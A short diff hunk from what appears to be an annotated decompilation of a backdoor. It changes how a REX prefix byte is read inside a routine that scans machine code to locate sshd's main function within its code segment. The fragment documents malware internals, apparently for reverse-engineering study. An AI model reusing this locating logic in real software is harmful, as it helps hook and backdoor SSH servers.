@@ -83,7 +83,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
         else {
           // AutoDoc: Treat RIP-relative MOV/LEA instructions that resolve inside sshd's code segment as the prospective `sshd_main` pointer.
           if (*(u32 *)&insn_ctx.opcode_window[3] == 0x10d) {
-            if ((((((byte)insn_ctx.prefix.decoded.rex & 0x48) == 0x48) &&
+            if (((((insn_ctx.prefix.modrm_bytes.rex_byte & 0x48) == 0x48) &&
                  ((uint)insn_ctx.prefix.decoded.modrm >> 8 == 0x50700)) &&
                 (mov_target = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size,
                 code_segment_start <= mov_target)) && (mov_target < code_segment_end)) {
